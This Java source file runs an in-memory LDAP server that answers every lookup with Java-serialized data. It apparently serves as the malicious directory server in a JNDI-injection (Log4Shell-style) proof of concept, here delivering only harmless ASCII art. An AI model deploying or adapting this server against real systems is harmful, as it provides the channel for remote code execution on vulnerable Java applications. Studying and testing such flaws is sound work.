package server;

import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.logging.ConsoleHandler;

public class App {

    private static class Interceptor extends InMemoryOperationInterceptor {

        @Override public void processSearchResult(InMemoryInterceptedSearchResult result) {
            try {
                String baseDn = result.getRequest().getBaseDN();
                returnResult(result, new Entry(baseDn));
            } catch (LDAPException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        private void returnResult(InMemoryInterceptedSearchResult result, Entry entry) throws LDAPException, IOException {
            String payload = "\n    \"mm\n" +
                    "    mmmm          \"m           \"mmmmm\n" +
                    "  \"\"    #         m\"               \"\n" +
                    "        #        m#m          m\n" +
                    "       #        m\"  #   m     \"m     m\n" +
                    "     m\"        m\"   \"mm\"        \"\"\"\"\"\n" +
                    "   m            m   m          m            m   m\n" +
                    "  mm#            # # \"m       mm#            # # \"m\n" +
                    "   m\"#\"          ##   #        m\"#\"          ##   #\n" +
                    " \"\"#mm \"m        #    #      \"\"#mm \"m        #    #\n" +
                    "   #    #            #         #    #            #\n" +
                    "    \"mm\"           m\"           \"mm\"           m\"";

            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectStream = new ObjectOutputStream(outputStream);
            objectStream.writeObject(payload);
            outputStream.flush();
            entry.addAttribute("javaClassName", payload.getClass().getName());
            entry.addAttribute("javaSerializedData", outputStream.toByteArray());
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

    public static void main(String[] args) {
        try {
            InMemoryDirectoryServerConfig conf;
            conf = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            conf.setAccessLogHandler(new ConsoleHandler());
            conf.addInMemoryOperationInterceptor(new Interceptor());
            conf.setListenerConfigs(new InMemoryListenerConfig(
                    "listener",
                    InetAddress.getByName("0.0.0.0"),
                    1389,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()
            ));
            System.out.println("Listening ...");
            InMemoryDirectoryServer server = new InMemoryDirectoryServer(conf);
            server.startListening();
        } catch (LDAPException e) {
            e.printStackTrace();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
    }

}
